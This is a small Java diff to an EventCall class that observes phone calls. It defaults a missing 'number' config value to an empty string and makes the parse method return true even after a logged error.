@@ -48,7 +48,10 @@ public class EventCall extends BaseEvent implements Observer<Call> {
 	@Override
 	public boolean parse(ConfEvent conf) {
 		try {
-			number = conf.getString("number");
+			if (conf.has("number") == true)
+				number = conf.getString("number");
+			else
+				number = "";
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " exitAction: " + actionOnExit + " number: \"");//$NON-NLS-1$ //$NON-NLS-2$
@@ -61,8 +64,6 @@ public class EventCall extends BaseEvent implements Observer<Call> {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: params FAILED");//$NON-NLS-1$
 			}
-
-			return false;
 		}
 
 		return true;
